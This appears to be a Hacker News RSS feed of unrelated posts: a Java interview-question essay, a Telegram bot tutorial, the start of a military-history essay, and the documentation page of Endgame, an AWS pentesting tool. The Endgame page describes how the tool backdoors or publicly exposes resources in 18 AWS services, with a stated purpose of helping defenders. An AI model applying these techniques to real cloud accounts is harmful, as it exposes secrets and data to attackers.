<p>Coming up with your own ‚ÄúFizz Buzz Test‚Äù[1] is not easy. I came up with the following requirements on which I evaluate such coding questions [2].</p>



<ol><li>It should be a real problem. The kind of problem you solve in a real-world scenario.</li><li>It should feel simple and give confidence to the developer that they can solve it.</li><li>The solution should not require more than 20 lines of code.</li><li>The problem should not be domain specific that it gives advantage to some candidates.</li><li>It should not require any special data structure, which you don‚Äôt use in your day to day work.</li><li>Problem should not have a long text. Anyone should be able to read the problem text in less than a minute.</li><li>It should not require knowledge of a special library function.</li><li>A reasonable developer should be able to write the first version in 15-20 minutes. Candidates do tend to miss a few aspects of the problem, so it can involve more than one iteration.</li></ol>



<p><strong><em>I have used this question for evaluating Java candidates only. It is possible that it is not a good question for your specific programming language. So, please keep </em></strong><strong><em>this point </em></strong><strong><em>in </em></strong><strong><em>your</em></strong><strong><em> mind.</em></strong></p>



<p>There are three skills that I am trying to evaluate about the candidate.</p>



<ol><li>Can they code?</li><li>Can they explain the code they have written?</li><li>Can they explain how they will test the code they have written?</li></ol>



<p>Coming back to the chunks problem, one possible Java solution is shown below.</p>


<pre title="">public static int[][] chunks(int[] numbers, int chunkSize) {
   int length = numbers.length;
   int resultArraySize = (length % chunkSize == 0) ? length / chunkSize : length / chunkSize + 1;
   int[][] result = new int[resultArraySize][];
 
   int numberArrIndex = 0;
   for (int i = 0; i &lt; resultArraySize; i++) {
       int chunkArraySize = i == resultArraySize - 1 &amp;&amp; (length % chunkSize != 0)
               ? length % chunkSize
               : chunkSize;
 
       int[] chunk = new int[chunkArraySize];
 
       for (int j = 0; j &lt; chunkArraySize; j++) {
           chunk[j] = numbers[numberArrIndex++];
       }
       result[i] = chunk;
   }
   return result;
}
</pre>


<p>Java 8 solution using the Stream API is shown below. I don‚Äôt expect candidates to write this version.</p>


<pre title="">public static int[][] chunk(int[] numbers, int size) {
   return IntStream.iterate(0, i -&gt; i + size)
           .limit((long) Math.ceil((double) numbers.length / size))
           .mapToObj(cur -&gt; Arrays.copyOfRange(numbers, cur, cur + size &gt; numbers.length ? numbers.length : cur + size))
           .toArray(int[][]::new);
}
</pre>


<p>My analysis is that only 10% of the total candidates solved the problem correctly in the first attempt. 30-40% missed a few scenarios and while explaining the solution they figured out the gaps and suggested improvements to fix their first version. And, remaining 50% failed to write even the partially correct first version.&nbsp;</p>



<p>Following are my observations on the attempts made by people:</p>



<ul><li>Candidates for some reason choose a function name different from chunks. I fail to understand why they don‚Äôt use function name as chunks. Some of the names used by candidates <em>getSmallArray</em>, <em>getChunksArray</em>, <em>getMeArray</em>, <em>getRefactorArray</em>, <em>getChunks</em>, <em>splitArrayInChunks</em>, <em>convertArray</em>, <em>splitArray</em>, <em>chunkInputArray</em>, etc.</li><li>Candidates who did well in the attempt first wrote chunks algorithm in plain English and then attempted to write code.</li><li>Candidates struggled to come up with the correct function declaration in the first go. They directly wrote the first version of the problem and then came up with the correct declaration.</li><li>Many candidates struggled with multi-dimensional array syntax.&nbsp;</li><li>The first solution written by most candidates didn‚Äôt handle the last chunk correctly. They created all chunks with equal size. So, the answer returned by their solution is [[1,2], [3,4], [5,0]]. Some candidates while explaining the solution with the example input figured out the problem and explained how they will handle this scenario.</li><li>Candidates struggled with the size of the result array. They need to consider whether the array is fully divisible by chunkSize or leaves a remainder.</li><li>Some candidates at times used String. They failed to make much progress.</li><li>Candidates make chunks an instance method of some class. They don‚Äôt think whether they should make the method static. For some reason, they think static is bad.</li><li>Some candidates prefer to convert an array to a List and then only they can write code.&nbsp;</li><li>Java developers still struggle with Generics. Only a handful of them were able to convert the program to a version that uses generics.</li><li>Only a handful of developers can eloquently explain the code they have written.&nbsp;</li></ul>



<p>By no means I am underestimating the pressure of giving an interview. Both taking a good interview and giving an interview are difficult. I know it is hard for most of us to write code when someone is watching us in an interview. But, given that this is the kind of code we write everyday and we do have to pair with others. I think it is still a better and scalable way to filter good candidates from average candidates.&nbsp;</p>



<h2>References</h2>



<ol><li>Fizz Buzz Test ‚Äì <a href="https://wiki.c2.com/?FizzBuzzTest">Link</a></li><li>Picking problems for programming interviews ‚Äì <a href="https://lethain.com/appropriate-programming-problems/">Link</a></li></ol>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://shekhargulati.com/2021/02/18/why-do-software-engineers-struggle-to-write-chunks-function/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26190554</guid>
            <pubDate>Fri, 19 Feb 2021 07:18:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Endgame: Creating Backdoors in AWS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26190497">thread link</a>) | @rishabhsagar
<br/>
February 18, 2021 | https://endgame.readthedocs.io/en/latest/ | <a href="https://web.archive.org/web/*/https://endgame.readthedocs.io/en/latest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-md-component="container">
      
      
        
      
      <main data-md-component="main">
        <div>
          
            
              
              
            
            
              
              
            
          
          <div>
            <article>
              
                
                  <a href="https://github.com/agnivesh/endgame/edit/master/docs/index.md" title="Edit this page">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"></path></svg>
                  </a>
                
                
                
<p>An AWS Pentesting tool that lets you use one-liner commands to backdoor an AWS account's resources with a rogue AWS account - or share the resources with the entire Internet üòà</p>
<p>
  <img src="https://endgame.readthedocs.io/en/latest/images/endgame.gif">
</p>

<p>Endgame abuses AWS's resource permission model to grant rogue users (or the Internet) access to an AWS account's resources with a single command. It does this through one of three methods:</p>
<ol>
<li>Modifying <a href="https://endgame.readthedocs.io/en/latest/resource-policy-primer/">resource-based policies</a> (such as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteAccessPermissionsReqd.html#bucket-policy-static-site">S3 Bucket policies</a> or <a href="https://docs.aws.amazon.com/lambda/latest/dg/access-control-resource-based.html#permissions-resource-xaccountinvoke">Lambda Function policies</a>)</li>
<li>Resources that can be made public through sharing APIs (such as <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/sharingamis-explicit.html">Amazon Machine Images (AMIs)</a>, <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html">EBS disk snapshots</a>, and <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ShareSnapshot.html">RDS database snapshots</a>)</li>
<li>Sharing resources via <a href="https://docs.aws.amazon.com/ram/latest/userguide/shareable.html">AWS Resource Access Manager (RAM)</a></li>
</ol>
<p>Endgame was created to:</p>
<ul>
<li>Push <a href="https://endgame.readthedocs.io/en/latest/recommendations-to-aws/">AWS</a> to improve coverage of AWS Access Analyzer so AWS users can protect themselves.</li>
<li>Show <a href="https://endgame.readthedocs.io/en/latest/recommendations-to-blue-teams/">blue teams</a> and developers what kind of damage can be done by overprivileged/leaked accounts.</li>
<li>Help red teams to demonstrate impact of their access.</li>
</ul>
<p>Endgame demonstrates (with a bit of shock and awe) how simple human errors in excessive permissions (such a granting <code>s3:*</code> access instead of <code>s3:GetObject</code>) can be abused by attackers. These are not new attacks, but AWS's ability to <strong>detect</strong> <em>and</em> <strong>prevent</strong> these attacks falls short of what customers need to protect themselves. This is what inspired us to write this tool. Follow the <a href="https://endgame.readthedocs.io/en/latest/tutorial/">Tutorial</a> and observe how you can expose resources across <strong>17 different AWS services</strong> to the Internet in a matter of seconds.</p>
<p>The resource types that can be exposed are of high value to attackers. This can include:</p>
<ul>
<li>Privileged compute access (by exposing who can invoke <code>lambda</code> functions)</li>
<li>Database snapshots (<code>rds</code>), Storage buckets (<code>s3</code>), file systems (<code>elasticfilesystem</code>), storage backups (<code>glacier</code>), disk snapshots (<code>ebs</code> snapshots),</li>
<li>Encryption keys (<code>kms</code>), secrets (<code>secretsmanager</code>), and private certificate authorities (<code>acm-pca</code>)</li>
<li>Messaging and notification services (<code>sqs</code> queues, <code>sns</code> topics, <code>ses</code> authorized senders)</li>
<li>Compute artifacts (<code>ec2</code> AMIs, <code>ecr</code> images, <code>lambda</code> layers)</li>
<li>Logging endpoints (<code>cloudwatch</code> resource policies)</li>
<li>Search and analytics engines (<code>elasticsearch</code> clusters)</li>
</ul>
<p>Endgame is an attack tool, but it was written with a specific purpose. We wrote this tool with desired outcomes for the following audiences:</p>
<ol>
<li><strong>AWS</strong>: We want AWS to empower their customers with the capabilities to fight these attacks. Our recommendations are outlined in the <a href="https://endgame.readthedocs.io/en/latest/recommendations-to-aws/">Recommendations to AWS</a> section.</li>
<li><strong>AWS Customers and their customers</strong>: It is better to have risks be more easily understood and know how to mitigate those risks than to force people to fight something novel. By increasing awareness about Resource Exposure and excessive permissions, we can protect ourselves against attacks where the attackers previously held the advantage and AWS customers were previously left blind.</li>
<li><strong>Blue Teams</strong>: Defense teams can leverage the guidance around user-agent detection, API call detection, and behavioral detection outlined in the <a href="https://endgame.readthedocs.io/en/latest/prevention/">Recommendations to Blue Teams</a> section.</li>
<li><strong>Red Teams</strong>: This will make for some very eventful red team exercises. Make sure you give the Blue Team kudos when they catch you!</li>
</ol>
<h2 id="supported-backdoors">Supported Backdoors</h2>
<p>Endgame can create backdoors for resources in any of the services listed in the table below.</p>
<p>Note: At the time of this writing, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html">AWS Access Analyzer</a> does <strong>NOT</strong> support auditing <strong>11 out of the 18 services</strong> that Endgame attacks. Given that Access Analyzer is intended to detect this exact kind of violation, we kindly suggest to the AWS Team that they support all resources that can be attacked using Endgame. üòä</p>
<table>
<thead>
<tr>
<th>Backdoor Resource Type</th>
<th>Endgame</th>
<th><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html">AWS Access Analyzer Support</a></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/acm-pca/">ACM Private CAs</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/logs/">CloudWatch Resource Policies</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/ebs/">EBS Volume Snapshots</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/amis/">EC2 AMIs</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/ecr/">ECR Container Repositories</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/efs/">EFS File Systems</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/es/">ElasticSearch Domains</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/glacier/">Glacier Vault Access Policies</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/iam-roles/">IAM Roles</a></td>
<td>‚úÖ</td>
<td>‚úÖ</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/kms/">KMS Keys</a></td>
<td>‚úÖ</td>
<td>‚úÖ</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/lambda-functions/">Lambda Functions</a></td>
<td>‚úÖ</td>
<td>‚úÖ</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/lambda-layers/">Lambda Layers</a></td>
<td>‚úÖ</td>
<td>‚úÖ</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/rds-snapshots/">RDS Snapshots</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/s3/">S3 Buckets</a></td>
<td>‚úÖ</td>
<td>‚úÖ</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/secretsmanager/">Secrets Manager Secrets</a></td>
<td>‚úÖ</td>
<td>‚úÖ</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/ses/">SES Sender Authorization Policies</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/sqs/">SQS Queues</a></td>
<td>‚úÖ</td>
<td>‚úÖ</td>
</tr>
<tr>
<td><a href="https://endgame.readthedocs.io/en/latest/risks/sns/">SNS Topics</a></td>
<td>‚úÖ</td>
<td>‚ùå</td>
</tr>
</tbody>
</table>
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        

      
    </div></div>]]>
            </description>
            <link>https://endgame.readthedocs.io/en/latest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26190497</guid>
            <pubDate>Fri, 19 Feb 2021 07:04:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Write and Read Google Spreadsheet from Telegram Bot with Google Cloud Functions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26190430">thread link</a>) | @fazlerocks
<br/>
February 18, 2021 | https://xakpc.info/write-and-read-google-spreadsheet-from-telegram-bot-with-google-cloud-functions | <a href="https://web.archive.org/web/*/https://xakpc.info/write-and-read-google-spreadsheet-from-telegram-bot-with-google-cloud-functions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1613670455547/FEONztOOP.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>Recently I faced a request</p>
<blockquote>
<p>I'm tracking the number of days off each person in my company in google sheets, where I manually add/subtract their remaining days off. Can a telegram bot show them how many days off they have left once they search for their names?</p>
</blockquote>
<p>The answer is yes, and here is how to do that with Google Cloud Functions and API.chat chatbot platform in <strong>under 100 lines of code</strong>.</p>
<h2 id="setup-google-functions">Setup Google Functions</h2>
<p>First, you need to set up cloud functions and give them access to our document. </p>
<p>Overall you will need two functions: <code>gsheet-get</code> to provide answers and <code>gsheet-add</code> to register users. Let's create them.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613663747484/Fas9Hx7_q.png?auto=compress" alt="image.png"></p>
<p>We do not care about the function code yet. When you set up the first function GCloud will probably ask you to enable Billing and, most importantly, will create a Service account - App Engine default service account. Usage of this account will allow you to perform <a target="_blank" href="https://github.com/googleapis/google-api-nodejs-client#service-account-credentials">server to server, app-level authentication</a>  later.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613663799653/PyiIOpK2x.png?auto=compress" alt="image.png"></p>
<p>But you do need to give access rights to our document to this account.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613662238923/jaVl7Falj.png?auto=compress" alt="image.png"></p>
<p>The document itself is quite simple 
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613663879198/fqWuUfk7H.png?auto=compress" alt="image.png"></p>
<h2 id="function-google-sheet-add">Function <code>google-sheet-add</code></h2>
<p>This function will store the user channel (telegram in the case), chat id, and a name to your table. Google Functions support different languages, including <code>.net core 3.1</code>, but I found out that node.js gives more compact code, so let's stick to it, and sorry for <em>dotnetish</em> code-style</p>
<pre><code><span>const</span> { google } = <span>require</span>(<span>'googleapis'</span>);

<span>exports</span>.main = <span>async</span> (req, res) =&gt; {
  <span>let</span> auth = <span>await</span> google.auth.getClient({ <span>scopes</span>: [<span>'https://www.googleapis.com/auth/spreadsheets'</span>] });  
  <span>let</span> sheets = google.sheets({ <span>version</span>: <span>'v4'</span>, auth });
  <span>try</span>
  {
    <span>await</span> sheets.spreadsheets.values.append({
      <span>spreadsheetId</span>: <span>"INSERT-SHEET-ID-HERE"</span>,
      <span>range</span>: <span>"Days!A:C"</span>,
      <span>valueInputOption</span>: <span>"RAW"</span>,
      <span>insertDataOption</span>: <span>"INSERT_ROWS"</span>,
      <span>resource</span>: {
        <span>values</span>: [
          [req.query.channel, req.query.id, req.query.name]
        ],
      },
      <span>auth</span>: auth
    });    
    res.status(<span>200</span>).send();
  }
  <span>catch</span> (err)
  {
    res.status(<span>500</span>).send({ err })
  }
};
</code></pre>
<p>The code here will append provided values as a new row to the Days sheet. API.chat will provide user data such as channel, chat id, and the name of the user.</p>
<p>Don't forget to add <code>googleapis</code> dependency into <code>package.json</code></p>
<pre><code>{
  <span>"dependencies"</span>: {
    <span>"googleapis"</span>: <span>"^42"</span>
  }
}
</code></pre><p>The main need for this function is to match actual people with their telegram account. There could be more sophisticated ways to do this, but for now this simple way: ask user name - is enough.</p>
<p>That will give you all the required information about the user and you could start calculating his day-offs.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613665878737/i_tzh-dEv.png?auto=compress" alt="image.png"></p>
<h2 id="function-google-sheet-get">Function <code>google-sheet-get</code></h2>
<p>The second function is for getting data from Google Spreadsheet. </p>
<pre><code><span>const</span> { google } = <span>require</span>(<span>'googleapis'</span>);

<span>exports</span>.main = <span>async</span> (req, res) =&gt; {
  <span>const</span> chatId = req.query.id;
  <span>const</span> auth = <span>await</span> google.auth.getClient({ <span>scopes</span>: [<span>'https://www.googleapis.com/auth/spreadsheets'</span>] });  
  <span>const</span> sheets = google.sheets({ <span>version</span>: <span>'v4'</span>, auth });
  <span>try</span> 
  {
    <span>let</span> sheet = <span>await</span> sheets.spreadsheets.values.get({
      <span>spreadsheetId</span>: <span>'INSERT-SHEET-ID-HERE'</span>,
      <span>range</span>: <span>'Days!A:D'</span>
    });

    <span>const</span> rows = sheet.data.values;
    <span>if</span> (rows.length) {
      <span>let</span> finded = rows.find(<span><span>el</span> =&gt;</span> el[<span>1</span>] === chatId)      
      <span>if</span> (finded === <span>undefined</span>) {     
        res.status(<span>200</span>).send({ <span>CorrelationId</span>: req.query.request, <span>Messages</span>: [ <span>"Information not availible"</span> ] });
      } <span>else</span> {      
        res.status(<span>200</span>).send({ <span>CorrelationId</span>: req.query.request, <span>Messages</span>: [ <span>`You have <span>${finded[<span>3</span>]}</span> days off`</span> ] });
      }
    } <span>else</span> {
      <span>console</span>.warn(<span>'No data found.'</span>);
      res.status(<span>200</span>).send({ <span>CorrelationId</span>: req.query.request, <span>Messages</span>: [ <span>"No data found"</span> ] });
    }
    res.status(<span>200</span>).send();
  }
  <span>catch</span>  (err)
  {
    <span>console</span>.error(<span>'The API returned an error: '</span> + err)
    res.status(<span>500</span>).send({ err })
  }
};
</code></pre><p>The main thing I found out here is that google.sheets API filter does not allow you to filter on actual data - only on metadata. That's why you need to get the entire sheet and filter it in code. Like I said before, API.chat will provide your endpoint with chat-id for filtering. From there you can return a formatted string with the answer like that</p>
<pre><code>{
  <span>"Messages"</span>: [
    <span>"You have 7 days off"</span>
  ]
}
</code></pre><h2 id="chatbot-scenario">Chatbot Scenario</h2>
<p>Now when you have all endpoints in place and working you can create an actual chatbot. I will use my very own <a target="_blank" href="https://api.chat/">chatbot builder API.chat</a>. Scenario might be very simple, like that </p>
<pre><code><span>&lt;<span>bot</span>&gt;</span>
  <span>&lt;<span>states</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Start"</span>&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"register"</span> <span>next</span>=<span>"Registration"</span>&gt;</span>Please enter your name<span>&lt;/<span>transition</span>&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"*"</span> <span>next</span>=<span>"Start"</span> <span>pending_keyboard</span>=<span>"Register Me"</span>&gt;</span>Hello. Please Register first<span>&lt;/<span>transition</span>&gt;</span>      
    <span>&lt;/<span>state</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Registration"</span>&gt;</span>      
      <span>&lt;<span>transition</span> <span>input</span>=<span>"*"</span> <span>next</span>=<span>"Registered"</span> <span>morphology</span>=<span>"msg"</span> <span>action</span>=<span>"https://us-central1-REDACTED.cloudfunctions.net/gsheet-add?name={msg}"</span> <span>no_stop</span>=<span>"true"</span>&gt;</span>Welcome!<span>&lt;/<span>transition</span>&gt;</span>
    <span>&lt;/<span>state</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Registered"</span>&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"days"</span> <span>next</span>=<span>"Registered"</span> <span>action</span>=<span>"https://us-central1-REDACTED.net/gsheet-get"</span> <span>pending_keyboard</span>=<span>"Days Off"</span>/&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"*"</span> <span>next</span>=<span>"Registered"</span> <span>pending_keyboard</span>=<span>"Days Off"</span>&gt;</span>Press the button to get your Days off<span>&lt;/<span>transition</span>&gt;</span>
    <span>&lt;/<span>state</span>&gt;</span>
  <span>&lt;/<span>states</span>&gt;</span>
<span>&lt;/<span>bot</span>&gt;</span>
</code></pre><p>What we do here is register the user, asking his or her name, and pass it into <code>gsheet-add</code> action in query. After registration user stays in the <code>Registered</code> state forever with the ability to request their days-off through <code>gsheet-get</code> action at any time.</p>
<p>All that's left is to PUT this scenario to the chatbot scenario endpoint and our bot is ready to deliver.</p>
<pre><code>curl -v -X PUT "https://bot.api.chat/v1/bots/botName/scenario"
-H "Content-Type: application/xml"
-H "Cache-Control: no-cache"
-H "Ocp-Apim-Subscription-Key: REDACTED"
--data-raw '<span>&lt;<span>bot</span>&gt;</span>
  <span>&lt;<span>states</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Start"</span>&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"register"</span> <span>next</span>=<span>"Registration"</span>&gt;</span>Please enter your name<span>&lt;/<span>transition</span>&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"*"</span> <span>next</span>=<span>"Start"</span> <span>pending_keyboard</span>=<span>"Register Me"</span>&gt;</span>Hello. Please Register first<span>&lt;/<span>transition</span>&gt;</span>      
    <span>&lt;/<span>state</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Registration"</span>&gt;</span>      
      <span>&lt;<span>transition</span> <span>input</span>=<span>"*"</span> <span>next</span>=<span>"Registered"</span> <span>morphology</span>=<span>"msg"</span> <span>action</span>=<span>"https://us-central1-REDACTED.cloudfunctions.net/gsheet-add?name={msg}"</span> <span>no_stop</span>=<span>"true"</span>&gt;</span>Welcome!<span>&lt;/<span>transition</span>&gt;</span>
    <span>&lt;/<span>state</span>&gt;</span>
    <span>&lt;<span>state</span> <span>name</span>=<span>"Registered"</span>&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"days"</span> <span>next</span>=<span>"Registered"</span> <span>action</span>=<span>"https://us-central1-REDACTED.cloudfunctions.net/gsheet-get"</span> <span>pending_keyboard</span>=<span>"Days Off"</span>/&gt;</span>
      <span>&lt;<span>transition</span> <span>input</span>=<span>"*"</span> <span>next</span>=<span>"Registered"</span> <span>pending_keyboard</span>=<span>"Days Off"</span>&gt;</span>Press the button to get your Days off<span>&lt;/<span>transition</span>&gt;</span>
    <span>&lt;/<span>state</span>&gt;</span>
  <span>&lt;/<span>states</span>&gt;</span>
<span>&lt;/<span>bot</span>&gt;</span>'
</code></pre><p>Let's count code lines</p>
<ul>
<li><code>google-sheet-add</code>: 25</li>
<li><code>google-sheet-get</code>: 30</li>
<li><code>scenario</code>: 15</li>
<li><strong>overall</strong>: 70 lines of code</li>
</ul>
<p>Not bad</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://xakpc.info/write-and-read-google-spreadsheet-from-telegram-bot-with-google-cloud-functions</link>
            <guid isPermaLink="false">hacker-news-small-sites-26190430</guid>
            <pubDate>Fri, 19 Feb 2021 06:48:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Universal Warrior, Part III: The Cult of the Badass]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26190353">thread link</a>) | @parsecs
<br/>
February 18, 2021 | https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the third and final part of a discussion (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">IIb</a>) discussion of the notion that there is a ‚Äòuniversal warrior‚Äô ‚Äì a transcendent sameness about either the experience of war or ‚Äòwarrior values‚Äô which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p>Over the last three weeks, we‚Äôve looked at the historical evidence to see if there was any hint of some universal war experience or set of warrior values.  What we‚Äôve found instead is that almost everything about how humans engage in war, aside from the fact that they do so, varies tremendously from one culture to the next, from one place to the next, from one period to the next.  Cultural expectations, social values, technological conditions, entire systems of warfare and simple circumstance also condition the experience of war and the values that combatants have in extreme ways which render the search for a ‚Äòuniversal‚Äô set of warrior values a clearly doomed enterprise.</p>



<p>But, as laid out in the beginning, the ‚Äòuniversal warrior‚Äô wasn‚Äôt merely a (deeply flawed) argument about the structure and experiences of the past, but the foundation stone in an ideological blueprint for living one‚Äôs modern life.  And so it is time now that we turn from the (quite bad) historical roots of this idea to the (worse, it turns out) ideological implications of the idea.</p>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>(I couldn‚Äôt decide quite how I wanted to illustrate this essay and it didn‚Äôt seem like quite the right content for historical cat photos, so I‚Äôve opted to leave it without images.  I may go back and add pictures at a later date, but for now, it can stand purely as an essay.)</p>



<h2>Once More, With Feeling</h2>



<p>In a sense, while the previous three posts have been fun, they were really just a very long preamble to the argument I am making here, so I want to both lay out <em>why</em> I opened with a three-week long preamble before getting to the point (‚Äòhow else would you know it was me?‚Äô) and also pull together the conclusions from all of that before we move forward.</p>



<p>So why the preamble?  Because I wanted to make sure before we started discussing the underlying ideology that lurks <em>behind</em> claims of the universality of some ‚Äòwarrior ethos‚Äô we had defused the retort that, whatever the unpleasant implications, the ‚Äòuniversal warrior‚Äô was <em>historically true</em>.  This had to be done first because <strong>I am of the opinion that</strong> <strong>truth is an absolute defense</strong> in such matters; the universe contains a great many facts which are frustratingly inconvenient, yet as historians we have to deal with the world as it is rather than as we wish it to be (or wish it to have been).  Consequently, before I could complain about the ideology, it was necessary to determine if the historical theory was true, or even remotely plausible.</p>



<p>So we have spent three weeks hunting for the ‚Äòuniversal warrior‚Äô ‚Äì either in the form of a universal war <em>experience</em> or a universal set of <em>values</em>.  What we have found is:</p>



<ul><li>Far from there being one set way that combatants relate to their society, soldiers, warriors and civilians represent distinct categories defined by how people in war relate to their society.  Even <em>within</em> those categories, variety is considerable, leaving no one clear model of how combatants relate to their societies.</li><li>Moreover, war itself is changeable, moving through at least three (and probably four) distinct systems of land warfare alone, each with substantial differences in tactics, values, and experiences.</li><li>Moreover, different cultures understand and imagine the ideal qualities of combatants differently, often so dramatically differently that one culture‚Äôs definition of courage is not merely different from an other‚Äôs, but diametrically opposed.</li><li>Moreover, the actual experience of battle ‚Äì we discussed this mostly through the experience of fear ‚Äì isn‚Äôt universal either.  The fear of facing a cavalry charge is not the same sort of fear as the fear of enduring a week long artillery barrage, while ‚Äòwar is scary‚Äô in a general sense is hardly enough to set off the warrior or the soldier from any number of other scary and potentially hazardous jobs.</li><li>Moreover, the bonds of comradeship that support modern cohesion (often cited as a unique and universal experience) are, in fact, also historically contingent, both in that there are many systems for generating cohesion, not all of which involve tight bonds formed during military service and that some military systems don‚Äôt seek to develop cohesion in this sense at all.</li><li>Moreover, attitudes towards the hardships of war <em>also</em> vary wildly, as do the actual hardships in question.</li><li>Moreover, not only do different societies express different attitudes and values towards the wounded, but the nature of the wounds themselves has changed over time as military technology has become progressively more lethal; both states that apply not only to physical, but also mental wounding.</li></ul>



<p>In short, while there is enough commonality in war to suggest a definition that encompasses the idea (again, I rather prefer W. Lee‚Äôs definition of war as ‚Äúorganized group activity, conducted with lethal effects, that diminishes one [unconsenting] group for the benefit of another‚Äù), <em>within </em>that definition, <strong>there is far too much variety to suggest there is any one ‚Äòuniversal‚Äô experience of war or any one set of universal warrior values</strong>.</p>



